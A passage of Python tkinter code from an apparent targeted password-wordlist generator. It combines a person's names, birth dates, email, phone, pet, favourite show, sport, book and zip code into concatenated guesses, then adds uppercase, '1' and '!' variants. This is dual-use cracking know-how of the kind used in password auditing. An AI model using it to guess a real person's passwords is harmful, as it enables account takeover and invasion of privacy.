			# This is what allows the save file dialog to function#
			#######################################################
			text_file = asksaveasfile(mode='w', defaultextension=".txt")
			##########################################################################
			# Just writing the variables that are commonly long enough to stand alone#
			##########################################################################
			text_file.write(name + '\n')
			text_file.write(lname + '\n')
			text_file.write(email + '\n')
			text_file.write(other + '\n')
			text_file.write(phone + '\n')
			text_file.write(pet + '\n')
			text_file.write(tv + '\n')
			text_file.write(sport + '\n')
			text_file.write(book + '\n')

			#################################################
			# This is how the custom passwords are generated#
			#################################################
			text_file.write(name + name +'\n')
			text_file.write(name + lname +'\n')
			text_file.write(name + monthn +'\n')
			text_file.write(name + monthl +'\n')
			text_file.write(name + days +'\n')
			text_file.write(name + year +'\n')
			text_file.write(name + yeart +'\n')
			text_file.write(name + email +'\n')
			text_file.write(name + other +'\n')
			text_file.write(name + phone +'\n')
			text_file.write(name + pet +'\n')
			text_file.write(name + tv +'\n')
			text_file.write(name + sport +'\n')
			text_file.write(name + book +'\n')
			text_file.write(name + zip +'\n')


			text_file.write(lname + name +'\n')
			text_file.write(lname + lname +'\n')
			text_file.write(lname + monthn +'\n')
			text_file.write(lname + monthl +'\n')
			text_file.write(lname + days +'\n')
			text_file.write(lname + year +'\n')
			text_file.write(lname + yeart +'\n')
			text_file.write(lname + email +'\n')
			text_file.write(lname + other +'\n')
			text_file.write(lname + phone +'\n')
			text_file.write(lname + pet +'\n')
			text_file.write(lname + tv +'\n')
			text_file.write(lname + sport +'\n')
			text_file.write(lname + book +'\n')
			text_file.write(lname + zip +'\n')


			text_file.write(monthn + name +'\n')
			text_file.write(monthn + lname +'\n')
			text_file.write(monthn + monthn +'\n')
			text_file.write(monthn + monthl +'\n')
			text_file.write(monthn + days +'\n')
			text_file.write(monthn + year +'\n')
			text_file.write(monthn + yeart +'\n')
			text_file.write(monthn + email +'\n')
			text_file.write(monthn + other +'\n')
			text_file.write(monthn + phone +'\n')
			text_file.write(monthn + pet +'\n')
			text_file.write(monthn + tv +'\n')
			text_file.write(monthn + sport +'\n')
			text_file.write(monthn + book +'\n')
			text_file.write(monthn + zip +'\n')


			text_file.write(monthl + name +'\n')
			text_file.write(monthl + lname +'\n')
			text_file.write(monthl + monthn +'\n')
			text_file.write(monthl + monthl +'\n')
			text_file.write(monthl + days +'\n')
			text_file.write(monthl + year +'\n')
			text_file.write(monthl + yeart +'\n')
			text_file.write(monthl + email +'\n')
			text_file.write(monthl + other +'\n')
			text_file.write(monthl + phone +'\n')
			text_file.write(monthl + pet +'\n')
			text_file.write(monthl + tv +'\n')
			text_file.write(monthl + sport +'\n')
			text_file.write(monthl + book +'\n')
			text_file.write(monthl + zip +'\n')


			text_file.write(days + name + '\n')
			text_file.write(days + lname + '\n')
			text_file.write(days + monthn + '\n')
			text_file.write(days + monthl + '\n')
			text_file.write(days + days + '\n')
			text_file.write(days + year + '\n')
			text_file.write(days + yeart + '\n')
			text_file.write(days + email + '\n')
			text_file.write(days + other + '\n')
			text_file.write(days + phone + '\n')
			text_file.write(days + pet + '\n')
			text_file.write(days + tv + '\n')
			text_file.write(days + sport + '\n')
			text_file.write(days + book + '\n')
			text_file.write(days + zip + '\n')


			text_file.write(year + name + '\n')
			text_file.write(year + lname + '\n')
			text_file.write(year + monthn + '\n')
			text_file.write(year + monthl + '\n')
			text_file.write(year + days + '\n')
			text_file.write(year + year + '\n')
			text_file.write(year + yeart + '\n')
			text_file.write(year + email + '\n')
			text_file.write(year + other + '\n')
			text_file.write(year + phone + '\n')
			text_file.write(year + pet + '\n')
			text_file.write(year + tv + '\n')
			text_file.write(year + sport + '\n')
			text_file.write(year + book + '\n')
			text_file.write(year + zip + '\n')

			text_file.write(yeart + name + '\n')
			text_file.write(yeart + lname + '\n')
			text_file.write(yeart + monthn + '\n')
			text_file.write(yeart + monthl + '\n')
			text_file.write(yeart + days + '\n')
			text_file.write(yeart + year + '\n')
			text_file.write(yeart + yeart + '\n')
			text_file.write(yeart + email + '\n')
			text_file.write(yeart + other + '\n')
			text_file.write(yeart + phone + '\n')
			text_file.write(yeart + pet + '\n')
			text_file.write(yeart + tv + '\n')
			text_file.write(yeart + sport + '\n')
			text_file.write(yeart + book + '\n')
			text_file.write(yeart + zip + '\n')

			text_file.write(email + name + '\n')
			text_file.write(email + lname + '\n')
			text_file.write(email + monthn + '\n')
			text_file.write(email + monthl + '\n')
			text_file.write(email + days + '\n')
			text_file.write(email + year + '\n')
			text_file.write(email + yeart + '\n')
			text_file.write(email + email + '\n')
			text_file.write(email + other + '\n')
			text_file.write(email + phone + '\n')
			text_file.write(email + pet + '\n')
			text_file.write(email + tv + '\n')
			text_file.write(email + sport + '\n')
			text_file.write(email + book + '\n')
			text_file.write(email + zip + '\n')

			text_file.write(other + name + '\n')
			text_file.write(other + lname + '\n')
			text_file.write(other + monthn + '\n')
			text_file.write(other + monthl + '\n')
			text_file.write(other + days + '\n')
			text_file.write(other + year + '\n')
			text_file.write(other + yeart + '\n')
			text_file.write(other + email + '\n')
			text_file.write(other + other + '\n')
			text_file.write(other + phone + '\n')
			text_file.write(other + pet + '\n')
			text_file.write(other + tv + '\n')
			text_file.write(other + sport + '\n')
			text_file.write(other + book + '\n')
			text_file.write(other + zip + '\n')

			text_file.write(phone + name + '\n')
			text_file.write(phone + lname + '\n')
			text_file.write(phone + monthn + '\n')
			text_file.write(phone + monthl + '\n')
			text_file.write(phone + days + '\n')
			text_file.write(phone + year + '\n')
			text_file.write(phone + yeart + '\n')
			text_file.write(phone + email + '\n')
			text_file.write(phone + other + '\n')
			text_file.write(phone + phone + '\n')
			text_file.write(phone + pet + '\n')
			text_file.write(phone + tv + '\n')
			text_file.write(phone + sport + '\n')
			text_file.write(phone + book + '\n')
			text_file.write(phone + zip + '\n')

			text_file.write(pet + name + '\n')
			text_file.write(pet + lname + '\n')
			text_file.write(pet + monthn + '\n')
			text_file.write(pet + monthl + '\n')
			text_file.write(pet + days + '\n')
			text_file.write(pet + year + '\n')
			text_file.write(pet + yeart + '\n')
			text_file.write(pet + email + '\n')
			text_file.write(pet + other + '\n')
			text_file.write(pet + phone + '\n')
			text_file.write(pet + pet + '\n')
			text_file.write(pet + tv + '\n')
			text_file.write(pet + sport + '\n')
			text_file.write(pet + book + '\n')
			text_file.write(pet + zip + '\n')

			text_file.write(tv + name + '\n')
			text_file.write(tv + lname + '\n')
			text_file.write(tv + monthn + '\n')
			text_file.write(tv + monthl + '\n')
			text_file.write(tv + days + '\n')
			text_file.write(tv + year + '\n')
			text_file.write(tv + yeart + '\n')
			text_file.write(tv + email + '\n')
			text_file.write(tv + other + '\n')
			text_file.write(tv + phone + '\n')
			text_file.write(tv + pet + '\n')
			text_file.write(tv + tv + '\n')
			text_file.write(tv + sport + '\n')
			text_file.write(tv + book + '\n')
			text_file.write(tv + zip + '\n')

			text_file.write(sport + name + '\n')
			text_file.write(sport + lname + '\n')
			text_file.write(sport + monthn + '\n')
			text_file.write(sport + monthl + '\n')
			text_file.write(sport + days + '\n')
			text_file.write(sport + year + '\n')
			text_file.write(sport + yeart + '\n')
			text_file.write(sport + email + '\n')
			text_file.write(sport + other + '\n')
			text_file.write(sport + phone + '\n')
			text_file.write(sport + pet + '\n')
			text_file.write(sport + tv + '\n')
			text_file.write(sport + sport + '\n')
			text_file.write(sport + book + '\n')
			text_file.write(sport + zip + '\n')

			text_file.write(book + name + '\n')
			text_file.write(book + lname + '\n')
			text_file.write(book + monthn + '\n')
			text_file.write(book + monthl + '\n')
			text_file.write(book + days + '\n')
			text_file.write(book + year + '\n')
			text_file.write(book + yeart + '\n')
			text_file.write(book + email + '\n')
			text_file.write(book + other + '\n')
			text_file.write(book + phone + '\n')
			text_file.write(book + pet + '\n')
			text_file.write(book + tv + '\n')
			text_file.write(book + sport + '\n')
			text_file.write(book + book + '\n')
			text_file.write(book + zip + '\n')

			text_file.write(zip + name + '\n')
			text_file.write(zip + lname + '\n')
			text_file.write(zip + monthn + '\n')
			text_file.write(zip + monthl + '\n')
			text_file.write(zip + days + '\n')
			text_file.write(zip + year + '\n')
			text_file.write(zip + yeart + '\n')
			text_file.write(zip + email + '\n')
			text_file.write(zip + other + '\n')
			text_file.write(zip + phone + '\n')
			text_file.write(zip + pet + '\n')
			text_file.write(zip + tv + '\n')
			text_file.write(zip + sport + '\n')
			text_file.write(zip + book + '\n')
			text_file.write(zip + zip + '\n')

			###########################################################################
			# .upper() Obviously is what generates all uppercase versions of a string.#
			###########################################################################
			name = self.name.get().upper()
			lname = self.lname.get().upper()
			monthn = self.monthn.get().upper()
			monthl = self.monthl.get().upper()
			days = self.days.get().upper()
			year = self.year.get().upper()
			yeart = self.yeart.get().upper()
			email = self.email.get().upper()
			other = self.other.get().upper()
			phone = self.phone.get().upper()
			pet = self.pet.get().upper()
			tv = self.tv.get().upper()
			sport = self.sport.get().upper()
			book = self.book.get().upper()
			zip = self.zip.get().upper()


			text_file.write(name + '\n')
			text_file.write(lname + '\n')
			text_file.write(email + '\n')
			text_file.write(other + '\n')
			text_file.write(phone + '\n')
			text_file.write(pet + '\n')
			text_file.write(tv + '\n')
			text_file.write(sport + '\n')
			text_file.write(book + '\n')

			text_file.write(name + name +'\n')
			text_file.write(name + lname +'\n')
			text_file.write(name + monthn +'\n')
			text_file.write(name + monthl +'\n')
			text_file.write(name + days +'\n')
			text_file.write(name + year +'\n')
			text_file.write(name + yeart +'\n')
			text_file.write(name + email +'\n')
			text_file.write(name + other +'\n')
			text_file.write(name + phone +'\n')
			text_file.write(name + pet +'\n')
			text_file.write(name + tv +'\n')
			text_file.write(name + sport +'\n')
			text_file.write(name + book +'\n')
			text_file.write(name + zip +'\n')


			text_file.write(lname + name +'\n')
			text_file.write(lname + lname +'\n')
			text_file.write(lname + monthn +'\n')
			text_file.write(lname + monthl +'\n')
			text_file.write(lname + days +'\n')
			text_file.write(lname + year +'\n')
			text_file.write(lname + yeart +'\n')
			text_file.write(lname + email +'\n')
			text_file.write(lname + other +'\n')
			text_file.write(lname + phone +'\n')
			text_file.write(lname + pet +'\n')
			text_file.write(lname + tv +'\n')
			text_file.write(lname + sport +'\n')
			text_file.write(lname + book +'\n')
			text_file.write(lname + zip +'\n')


			text_file.write(monthn + name +'\n')
			text_file.write(monthn + lname +'\n')
			text_file.write(monthn + monthn +'\n')
			text_file.write(monthn + monthl +'\n')
			text_file.write(monthn + days +'\n')
			text_file.write(monthn + year +'\n')
			text_file.write(monthn + yeart +'\n')
			text_file.write(monthn + email +'\n')
			text_file.write(monthn + other +'\n')
			text_file.write(monthn + phone +'\n')
			text_file.write(monthn + pet +'\n')
			text_file.write(monthn + tv +'\n')
			text_file.write(monthn + sport +'\n')
			text_file.write(monthn + book +'\n')
			text_file.write(monthn + zip +'\n')


			text_file.write(monthl + name +'\n')
			text_file.write(monthl + lname +'\n')
			text_file.write(monthl + monthn +'\n')
			text_file.write(monthl + monthl +'\n')
			text_file.write(monthl + days +'\n')
			text_file.write(monthl + year +'\n')
			text_file.write(monthl + yeart +'\n')
			text_file.write(monthl + email +'\n')
			text_file.write(monthl + other +'\n')
			text_file.write(monthl + phone +'\n')
			text_file.write(monthl + pet +'\n')
			text_file.write(monthl + tv +'\n')
			text_file.write(monthl + sport +'\n')
			text_file.write(monthl + book +'\n')
			text_file.write(monthl + zip +'\n')


			text_file.write(days + name + '\n')
			text_file.write(days + lname + '\n')
			text_file.write(days + monthn + '\n')
			text_file.write(days + monthl + '\n')
			text_file.write(days + days + '\n')
			text_file.write(days + year + '\n')
			text_file.write(days + yeart + '\n')
			text_file.write(days + email + '\n')
			text_file.write(days + other + '\n')
			text_file.write(days + phone + '\n')
			text_file.write(days + pet + '\n')
			text_file.write(days + tv + '\n')
			text_file.write(days + sport + '\n')
			text_file.write(days + book + '\n')
			text_file.write(days + zip + '\n')


			text_file.write(year + name + '\n')
			text_file.write(year + lname + '\n')
			text_file.write(year + monthn + '\n')
			text_file.write(year + monthl + '\n')
			text_file.write(year + days + '\n')
			text_file.write(year + year + '\n')
			text_file.write(year + yeart + '\n')
			text_file.write(year + email + '\n')
			text_file.write(year + other + '\n')
			text_file.write(year + phone + '\n')
			text_file.write(year + pet + '\n')
			text_file.write(year + tv + '\n')
			text_file.write(year + sport + '\n')
			text_file.write(year + book + '\n')
			text_file.write(year + zip + '\n')

			text_file.write(yeart + name + '\n')
			text_file.write(yeart + lname + '\n')
			text_file.write(yeart + monthn + '\n')
			text_file.write(yeart + monthl + '\n')
			text_file.write(yeart + days + '\n')
			text_file.write(yeart + year + '\n')
			text_file.write(yeart + yeart + '\n')
			text_file.write(yeart + email + '\n')
			text_file.write(yeart + other + '\n')
			text_file.write(yeart + phone + '\n')
			text_file.write(yeart + pet + '\n')
			text_file.write(yeart + tv + '\n')
			text_file.write(yeart + sport + '\n')
			text_file.write(yeart + book + '\n')
			text_file.write(yeart + zip + '\n')

			text_file.write(email + name + '\n')
			text_file.write(email + lname + '\n')
			text_file.write(email + monthn + '\n')
			text_file.write(email + monthl + '\n')
			text_file.write(email + days + '\n')
			text_file.write(email + year + '\n')
			text_file.write(email + yeart + '\n')
			text_file.write(email + email + '\n')
			text_file.write(email + other + '\n')
			text_file.write(email + phone + '\n')
			text_file.write(email + pet + '\n')
			text_file.write(email + tv + '\n')
			text_file.write(email + sport + '\n')
			text_file.write(email + book + '\n')
			text_file.write(email + zip + '\n')

			text_file.write(other + name + '\n')
			text_file.write(other + lname + '\n')
			text_file.write(other + monthn + '\n')
			text_file.write(other + monthl + '\n')
			text_file.write(other + days + '\n')
			text_file.write(other + year + '\n')
			text_file.write(other + yeart + '\n')
			text_file.write(other + email + '\n')
			text_file.write(other + other + '\n')
			text_file.write(other + phone + '\n')
			text_file.write(other + pet + '\n')
			text_file.write(other + tv + '\n')
			text_file.write(other + sport + '\n')
			text_file.write(other + book + '\n')
			text_file.write(other + zip + '\n')

			text_file.write(phone + name + '\n')
			text_file.write(phone + lname + '\n')
			text_file.write(phone + monthn + '\n')
			text_file.write(phone + monthl + '\n')
			text_file.write(phone + days + '\n')
			text_file.write(phone + year + '\n')
			text_file.write(phone + yeart + '\n')
			text_file.write(phone + email + '\n')
			text_file.write(phone + other + '\n')
			text_file.write(phone + phone + '\n')
			text_file.write(phone + pet + '\n')
			text_file.write(phone + tv + '\n')
			text_file.write(phone + sport + '\n')
			text_file.write(phone + book + '\n')
			text_file.write(phone + zip + '\n')

			text_file.write(pet + name + '\n')
			text_file.write(pet + lname + '\n')
			text_file.write(pet + monthn + '\n')
			text_file.write(pet + monthl + '\n')
			text_file.write(pet + days + '\n')
			text_file.write(pet + year + '\n')
			text_file.write(pet + yeart + '\n')
			text_file.write(pet + email + '\n')
			text_file.write(pet + other + '\n')
			text_file.write(pet + phone + '\n')
			text_file.write(pet + pet + '\n')
			text_file.write(pet + tv + '\n')
			text_file.write(pet + sport + '\n')
			text_file.write(pet + book + '\n')
			text_file.write(pet + zip + '\n')

			text_file.write(tv + name + '\n')
			text_file.write(tv + lname + '\n')
			text_file.write(tv + monthn + '\n')
			text_file.write(tv + monthl + '\n')
			text_file.write(tv + days + '\n')
			text_file.write(tv + year + '\n')
			text_file.write(tv + yeart + '\n')
			text_file.write(tv + email + '\n')
			text_file.write(tv + other + '\n')
			text_file.write(tv + phone + '\n')
			text_file.write(tv + pet + '\n')
			text_file.write(tv + tv + '\n')
			text_file.write(tv + sport + '\n')
			text_file.write(tv + book + '\n')
			text_file.write(tv + zip + '\n')

			text_file.write(sport + name + '\n')
			text_file.write(sport + lname + '\n')
			text_file.write(sport + monthn + '\n')
			text_file.write(sport + monthl + '\n')
			text_file.write(sport + days + '\n')
			text_file.write(sport + year + '\n')
			text_file.write(sport + yeart + '\n')
			text_file.write(sport + email + '\n')
			text_file.write(sport + other + '\n')
			text_file.write(sport + phone + '\n')
			text_file.write(sport + pet + '\n')
			text_file.write(sport + tv + '\n')
			text_file.write(sport + sport + '\n')
			text_file.write(sport + book + '\n')
			text_file.write(sport + zip + '\n')

			text_file.write(book + name + '\n')
			text_file.write(book + lname + '\n')
			text_file.write(book + monthn + '\n')
			text_file.write(book + monthl + '\n')
			text_file.write(book + days + '\n')
			text_file.write(book + year + '\n')
			text_file.write(book + yeart + '\n')
			text_file.write(book + email + '\n')
			text_file.write(book + other + '\n')
			text_file.write(book + phone + '\n')
			text_file.write(book + pet + '\n')
			text_file.write(book + tv + '\n')
			text_file.write(book + sport + '\n')
			text_file.write(book + book + '\n')
			text_file.write(book + zip + '\n')

			text_file.write(zip + name + '\n')
			text_file.write(zip + lname + '\n')
			text_file.write(zip + monthn + '\n')
			text_file.write(zip + monthl + '\n')
			text_file.write(zip + days + '\n')
			text_file.write(zip + year + '\n')
			text_file.write(zip + yeart + '\n')
			text_file.write(zip + email + '\n')
			text_file.write(zip + other + '\n')
			text_file.write(zip + phone + '\n')
			text_file.write(zip + pet + '\n')
			text_file.write(zip + tv + '\n')
			text_file.write(zip + sport + '\n')
			text_file.write(zip + book + '\n')
			text_file.write(zip + zip + '\n')

			#####################################
			name = self.name.get().upper() + "1"
			lname = self.lname.get().upper() + "1"
			monthn = self.monthn.get().upper() + "1"
			monthl = self.monthl.get().upper() + "1"
			days = self.days.get().upper() + "1"
			year = self.year.get().upper() + "1"
			yeart = self.yeart.get().upper() + "1"
			email = self.email.get().upper() + "1"
			other = self.other.get().upper() + "1"
			phone = self.phone.get().upper() + "1"
			pet = self.pet.get().upper() + "1"
			tv = self.tv.get().upper() + "1"
			sport = self.sport.get().upper() + "1"
			book = self.book.get().upper() + "1"
			zip = self.zip.get().upper() + "1"


			text_file.write(name + '\n')
			text_file.write(lname + '\n')
			text_file.write(email + '\n')
			text_file.write(other + '\n')
			text_file.write(phone + '\n')
			text_file.write(pet + '\n')
			text_file.write(tv + '\n')
			text_file.write(sport + '\n')
			text_file.write(book + '\n')

			text_file.write(name + name +'\n')
			text_file.write(name + lname +'\n')
			text_file.write(name + monthn +'\n')
			text_file.write(name + monthl +'\n')
			text_file.write(name + days +'\n')
			text_file.write(name + year +'\n')
			text_file.write(name + yeart +'\n')
			text_file.write(name + email +'\n')
			text_file.write(name + other +'\n')
			text_file.write(name + phone +'\n')
			text_file.write(name + pet +'\n')
			text_file.write(name + tv +'\n')
			text_file.write(name + sport +'\n')
			text_file.write(name + book +'\n')
			text_file.write(name + zip +'\n')


			text_file.write(lname + name +'\n')
			text_file.write(lname + lname +'\n')
			text_file.write(lname + monthn +'\n')
			text_file.write(lname + monthl +'\n')
			text_file.write(lname + days +'\n')
			text_file.write(lname + year +'\n')
			text_file.write(lname + yeart +'\n')
			text_file.write(lname + email +'\n')
			text_file.write(lname + other +'\n')
			text_file.write(lname + phone +'\n')
			text_file.write(lname + pet +'\n')
			text_file.write(lname + tv +'\n')
			text_file.write(lname + sport +'\n')
			text_file.write(lname + book +'\n')
			text_file.write(lname + zip +'\n')


			text_file.write(monthn + name +'\n')
			text_file.write(monthn + lname +'\n')
			text_file.write(monthn + monthn +'\n')
			text_file.write(monthn + monthl +'\n')
			text_file.write(monthn + days +'\n')
			text_file.write(monthn + year +'\n')
			text_file.write(monthn + yeart +'\n')
			text_file.write(monthn + email +'\n')
			text_file.write(monthn + other +'\n')
			text_file.write(monthn + phone +'\n')
			text_file.write(monthn + pet +'\n')
			text_file.write(monthn + tv +'\n')
			text_file.write(monthn + sport +'\n')
			text_file.write(monthn + book +'\n')
			text_file.write(monthn + zip +'\n')


			text_file.write(monthl + name +'\n')
			text_file.write(monthl + lname +'\n')
			text_file.write(monthl + monthn +'\n')
			text_file.write(monthl + monthl +'\n')
			text_file.write(monthl + days +'\n')
			text_file.write(monthl + year +'\n')
			text_file.write(monthl + yeart +'\n')
			text_file.write(monthl + email +'\n')
			text_file.write(monthl + other +'\n')
			text_file.write(monthl + phone +'\n')
			text_file.write(monthl + pet +'\n')
			text_file.write(monthl + tv +'\n')
			text_file.write(monthl + sport +'\n')
			text_file.write(monthl + book +'\n')
			text_file.write(monthl + zip +'\n')


			text_file.write(days + name + '\n')
			text_file.write(days + lname + '\n')
			text_file.write(days + monthn + '\n')
			text_file.write(days + monthl + '\n')
			text_file.write(days + days + '\n')
			text_file.write(days + year + '\n')
			text_file.write(days + yeart + '\n')
			text_file.write(days + email + '\n')
			text_file.write(days + other + '\n')
			text_file.write(days + phone + '\n')
			text_file.write(days + pet + '\n')
			text_file.write(days + tv + '\n')
			text_file.write(days + sport + '\n')
			text_file.write(days + book + '\n')
			text_file.write(days + zip + '\n')


			text_file.write(year + name + '\n')
			text_file.write(year + lname + '\n')
			text_file.write(year + monthn + '\n')
			text_file.write(year + monthl + '\n')
			text_file.write(year + days + '\n')
			text_file.write(year + year + '\n')
			text_file.write(year + yeart + '\n')
			text_file.write(year + email + '\n')
			text_file.write(year + other + '\n')
			text_file.write(year + phone + '\n')
			text_file.write(year + pet + '\n')
			text_file.write(year + tv + '\n')
			text_file.write(year + sport + '\n')
			text_file.write(year + book + '\n')
			text_file.write(year + zip + '\n')

			text_file.write(yeart + name + '\n')
			text_file.write(yeart + lname + '\n')
			text_file.write(yeart + monthn + '\n')
			text_file.write(yeart + monthl + '\n')
			text_file.write(yeart + days + '\n')
			text_file.write(yeart + year + '\n')
			text_file.write(yeart + yeart + '\n')
			text_file.write(yeart + email + '\n')
			text_file.write(yeart + other + '\n')
			text_file.write(yeart + phone + '\n')
			text_file.write(yeart + pet + '\n')
			text_file.write(yeart + tv + '\n')
			text_file.write(yeart + sport + '\n')
			text_file.write(yeart + book + '\n')
			text_file.write(yeart + zip + '\n')

			text_file.write(email + name + '\n')
			text_file.write(email + lname + '\n')
			text_file.write(email + monthn + '\n')
			text_file.write(email + monthl + '\n')
			text_file.write(email + days + '\n')
			text_file.write(email + year + '\n')
			text_file.write(email + yeart + '\n')
			text_file.write(email + email + '\n')
			text_file.write(email + other + '\n')
			text_file.write(email + phone + '\n')
			text_file.write(email + pet + '\n')
			text_file.write(email + tv + '\n')
			text_file.write(email + sport + '\n')
			text_file.write(email + book + '\n')
			text_file.write(email + zip + '\n')

			text_file.write(other + name + '\n')
			text_file.write(other + lname + '\n')
			text_file.write(other + monthn + '\n')
			text_file.write(other + monthl + '\n')
			text_file.write(other + days + '\n')
			text_file.write(other + year + '\n')
			text_file.write(other + yeart + '\n')
			text_file.write(other + email + '\n')
			text_file.write(other + other + '\n')
			text_file.write(other + phone + '\n')
			text_file.write(other + pet + '\n')
			text_file.write(other + tv + '\n')
			text_file.write(other + sport + '\n')
			text_file.write(other + book + '\n')
			text_file.write(other + zip + '\n')

			text_file.write(phone + name + '\n')
			text_file.write(phone + lname + '\n')
			text_file.write(phone + monthn + '\n')
			text_file.write(phone + monthl + '\n')
			text_file.write(phone + days + '\n')
			text_file.write(phone + year + '\n')
			text_file.write(phone + yeart + '\n')
			text_file.write(phone + email + '\n')
			text_file.write(phone + other + '\n')
			text_file.write(phone + phone + '\n')
			text_file.write(phone + pet + '\n')
			text_file.write(phone + tv + '\n')
			text_file.write(phone + sport + '\n')
			text_file.write(phone + book + '\n')
			text_file.write(phone + zip + '\n')

			text_file.write(pet + name + '\n')
			text_file.write(pet + lname + '\n')
			text_file.write(pet + monthn + '\n')
			text_file.write(pet + monthl + '\n')
			text_file.write(pet + days + '\n')
			text_file.write(pet + year + '\n')
			text_file.write(pet + yeart + '\n')
			text_file.write(pet + email + '\n')
			text_file.write(pet + other + '\n')
			text_file.write(pet + phone + '\n')
			text_file.write(pet + pet + '\n')
			text_file.write(pet + tv + '\n')
			text_file.write(pet + sport + '\n')
			text_file.write(pet + book + '\n')
			text_file.write(pet + zip + '\n')

			text_file.write(tv + name + '\n')
			text_file.write(tv + lname + '\n')
			text_file.write(tv + monthn + '\n')
			text_file.write(tv + monthl + '\n')
			text_file.write(tv + days + '\n')
			text_file.write(tv + year + '\n')
			text_file.write(tv + yeart + '\n')
			text_file.write(tv + email + '\n')
			text_file.write(tv + other + '\n')
			text_file.write(tv + phone + '\n')
			text_file.write(tv + pet + '\n')
			text_file.write(tv + tv + '\n')
			text_file.write(tv + sport + '\n')
			text_file.write(tv + book + '\n')
			text_file.write(tv + zip + '\n')

			text_file.write(sport + name + '\n')
			text_file.write(sport + lname + '\n')
			text_file.write(sport + monthn + '\n')
			text_file.write(sport + monthl + '\n')
			text_file.write(sport + days + '\n')
			text_file.write(sport + year + '\n')
			text_file.write(sport + yeart + '\n')
			text_file.write(sport + email + '\n')
			text_file.write(sport + other + '\n')
			text_file.write(sport + phone + '\n')
			text_file.write(sport + pet + '\n')
			text_file.write(sport + tv + '\n')
			text_file.write(sport + sport + '\n')
			text_file.write(sport + book + '\n')
			text_file.write(sport + zip + '\n')

			text_file.write(book + name + '\n')
			text_file.write(book + lname + '\n')
			text_file.write(book + monthn + '\n')
			text_file.write(book + monthl + '\n')
			text_file.write(book + days + '\n')
			text_file.write(book + year + '\n')
			text_file.write(book + yeart + '\n')
			text_file.write(book + email + '\n')
			text_file.write(book + other + '\n')
			text_file.write(book + phone + '\n')
			text_file.write(book + pet + '\n')
			text_file.write(book + tv + '\n')
			text_file.write(book + sport + '\n')
			text_file.write(book + book + '\n')
			text_file.write(book + zip + '\n')

			text_file.write(zip + name + '\n')
			text_file.write(zip + lname + '\n')
			text_file.write(zip + monthn + '\n')
			text_file.write(zip + monthl + '\n')
			text_file.write(zip + days + '\n')
			text_file.write(zip + year + '\n')
			text_file.write(zip + yeart + '\n')
			text_file.write(zip + email + '\n')
			text_file.write(zip + other + '\n')
			text_file.write(zip + phone + '\n')
			text_file.write(zip + pet + '\n')
			text_file.write(zip + tv + '\n')
			text_file.write(zip + sport + '\n')
			text_file.write(zip + book + '\n')
			text_file.write(zip + zip + '\n')
			#############################################################################
			# Using different string commands, I can generate large amounts of passwords#
			#############################################################################
			name = self.name.get().upper() + "!"
			lname = self.lname.get().upper() + "!"
			monthn = self.monthn.get().upper() + "!"
			monthl = self.monthl.get().upper() + "!"
			days = self.days.get().upper() + "!"
			year = self.year.get().upper() + "!"
			yeart = self.yeart.get().upper() + "!"
			email = self.email.get().upper() + "!"
			other = self.other.get().upper() + "!"
			phone = self.phone.get().upper() + "!"
			pet = self.pet.get().upper() + "!"
			tv = self.tv.get().upper() + "!"
			sport = self.sport.get().upper() + "!"
			book = self.book.get().upper() + "!"
			zip = self.zip.get().upper() + "!"


			text_file.write(name + '\n')
			text_file.write(lname + '\n')
			text_file.write(email + '\n')
			text_file.write(other + '\n')
			text_file.write(phone + '\n')
			text_file.write(pet + '\n')
			text_file.write(tv + '\n')
			text_file.write(sport + '\n')
			text_file.write(book + '\n')

			text_file.write(name + name +'\n')
			text_file.write(name + lname +'\n')
			text_file.write(name + monthn +'\n')
			text_file.write(name + monthl +'\n')
			text_file.write(name + days +'\n')
			text_file.write(name + year +'\n')
			text_file.write(name + yeart +'\n')
			text_file.write(name + email +'\n')
			text_file.write(name + other +'\n')
			text_file.write(name + phone +'\n')
			text_file.write(name + pet +'\n')
			text_file.write(name + tv +'\n')
			text_file.write(name + sport +'\n')
			text_file.write(name + book +'\n')
			text_file.write(name + zip +'\n')


			text_file.write(lname + name +'\n')
			text_file.write(lname + lname +'\n')
			text_file.write(lname + monthn +'\n')
			text_file.write(lname + monthl +'\n')
			text_file.write(lname + days +'\n')
			text_file.write(lname + year +'\n')
			text_file.write(lname + yeart +'\n')
			text_file.write(lname + email +'\n')
			text_file.write(lname + other +'\n')
			text_file.write(lname + phone +'\n')
			text_file.write(lname + pet +'\n')
			text_file.write(lname + tv +'\n')
			text_file.write(lname + sport +'\n')
			text_file.write(lname + book +'\n')
			text_file.write(lname + zip +'\n')


			text_file.write(monthn + name +'\n')
			text_file.write(monthn + lname +'\n')
			text_file.write(monthn + monthn +'\n')
			text_file.write(monthn + monthl +'\n')
			text_file.write(monthn + days +'\n')
			text_file.write(monthn + year +'\n')
			text_file.write(monthn + yeart +'\n')
			text_file.write(monthn + email +'\n')
			text_file.write(monthn + other +'\n')
			text_file.write(monthn + phone +'\n')
			text_file.write(monthn + pet +'\n')
			text_file.write(monthn + tv +'\n')
			text_file.write(monthn + sport +'\n')
			text_file.write(monthn + book +'\n')
			text_file.write(monthn + zip +'\n')


			text_file.write(monthl + name +'\n')
			text_file.write(monthl + lname +'\n')
			text_file.write(monthl + monthn +'\n')
			text_file.write(monthl + monthl +'\n')
			text_file.write(monthl + days +'\n')
			text_file.write(monthl + year +'\n')
			text_file.write(monthl + yeart +'\n')
			text_file.write(monthl + email +'\n')
			text_file.write(monthl + other +'\n')
			text_file.write(monthl + phone +'\n')
			text_file.write(monthl + pet +'\n')
			text_file.write(monthl + tv +'\n')
			text_file.write(monthl + sport +'\n')
			text_file.write(monthl + book +'\n')
			text_file.write(monthl + zip +'\n')


			text_file.write(days + name + '\n')
			text_file.write(days + lname + '\n')
			text_file.write(days + monthn + '\n')
			text_file.write(days + monthl + '\n')
			text_file.write(days + days + '\n')
			text_file.write(days + year + '\n')
			text_file.write(days + yeart + '\n')
			text_file.write(days + email + '\n')
			text_file.write(days + other + '\n')
			text_file.write(days + phone + '\n')
			text_file.write(days + pet + '\n')
			text_file.write(days + tv + '\n')
			text_file.write(days + sport + '\n')
			text_file.write(days + book + '\n')
			text_file.write(days + zip + '\n')


			text_file.write(year + name + '\n')
			text_file.write(year + lname + '\n')
			text_file.write(year + monthn + '\n')
			text_file.write(year + monthl + '\n')
			text_file.write(year + days + '\n')
			text_file.write(year + year + '\n')
			text_file.write(year + yeart + '\n')
			text_file.write(year + email + '\n')
			text_file.write(year + other + '\n')
			text_file.write(year + phone + '\n')
			text_file.write(year + pet + '\n')
			text_file.write(year + tv + '\n')
			text_file.write(year + sport + '\n')
			text_file.write(year + book + '\n')
			text_file.write(year + zip + '\n')

			text_file.write(yeart + name + '\n')
